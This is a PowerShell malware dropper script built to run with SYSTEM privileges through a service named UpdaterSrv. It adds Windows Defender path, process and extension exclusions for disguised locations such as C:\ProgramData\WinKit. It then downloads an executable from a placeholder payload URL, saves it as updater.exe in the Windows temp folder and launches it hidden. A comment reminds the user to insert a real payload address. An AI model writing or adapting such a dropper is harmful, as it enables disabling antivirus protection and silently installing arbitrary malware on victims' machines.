# ----------------------------------------
# script.ps1 (Optimized for LocalSystem Service Execution)
# This script will be executed with SYSTEM privileges by your UpdaterSrv.
# It adds Windows Defender exclusions and fetches/executes a payload.
# ----------------------------------------

$logPath = "C:\Windows\Temp\boot_execution_log.txt"
$logDirectory = Split-Path $logPath -Parent

# Ensure the log directory exists
if (-not (Test-Path $logDirectory)) {
    New-Item -ItemType Directory -Path $logDirectory -Force | Out-Null
}

Add-Content -Path $logPath -Value "Script started at $(Get-Date) - Running under SYSTEM account."

# --- Optional: Verify Admin Status (for logging/debugging) ---
function Is-Admin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}
if (Is-Admin) {
    Add-Content -Path $logPath -Value "Confirmed: Script is running with Administrator (SYSTEM) privileges."
} else {
    Add-Content -Path $logPath -Value "WARNING: Script is NOT running with Administrator privileges. Commands might fail."
    # This block should ideally not be hit if UpdaterSrv runs as LocalSystem.
}

# --- Add Windows Defender Exclusions ---
Add-Content -Path $logPath -Value "Attempting to add Windows Defender exclusions."

$exclusions = @(
    "C:\Users\Public\SystemLib",
    "C:\Windows\Temp\updater.exe",
    "C:\ProgramData\WinKit"
)

foreach ($excl in $exclusions) {
    try {
        $currentExclusions = Get-MpPreference
        
        # Check if exclusion path already exists
        $pathExists = ($currentExclusions.ExclusionPath | Where-Object { $_ -eq $excl }) -ne $null
        # Check if exclusion process already exists
        $processExists = ($currentExclusions.ExclusionProcess | Where-Object { $_ -eq $excl }) -ne $null
        
        # Check for extension if applicable (e.g., for ".exe")
        $ext = [System.IO.Path]::GetExtension($excl).TrimStart(".")
        $extensionExists = $false
        if ($ext) {
            $extensionExists = ($currentExclusions.ExclusionExtension | Where-Object { $_ -eq $ext }) -ne $null
        }

        if (-not ($pathExists -or $processExists -or ($ext -and $extensionExists))) {
            Add-MpPreference -ExclusionPath $excl -ErrorAction SilentlyContinue
            Add-MpPreference -ExclusionProcess $excl -ErrorAction SilentlyContinue
            if ($ext) {
                Add-MpPreference -ExclusionExtension $ext -ErrorAction SilentlyContinue
            }
            Add-Content $logPath "Exclusion added: $excl"
        } else {
            Add-Content $logPath "Exclusion already exists: $excl"
        }
    } catch {
        Add-Content -Path $logPath "Failed to add exclusion: $excl - Error: $_"
    }
}
Add-Content -Path $logPath -Value "Finished attempting to add Windows Defender exclusions."

# --- Fetch and Execute Payload ---
$payloadUrl = "https://mywebsite.com/payload.exe" # <-- REMINDER: REPLACE WITH YOUR ACTUAL PAYLOAD URL
$payloadPath = "C:\Windows\Temp\updater.exe"

Add-Content -Path $logPath -Value "Attempting to fetch and execute payload from $payloadUrl."

try {
    # Ensure payload directory exists
    if (-not (Test-Path (Split-Path $payloadPath -Parent))) {
        New-Item -ItemType Directory -Path (Split-Path $payloadPath -Parent) -Force | Out-Null
    }

    # Download the payload
    Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing -TimeoutSec 30
    Add-Content -Path $logPath "Payload downloaded to $payloadPath."

    # Execute the payload silently
    Start-Process -FilePath $payloadPath -WindowStyle Hidden
    Add-Content -Path $logPath "Payload executed successfully."

} catch {
    Add-Content -Path $logPath "Failed to fetch or execute payload from $payloadUrl. Error: $_"
}

Add-Content -Path $logPath -Value "Script execution finished at $(Get-Date)."
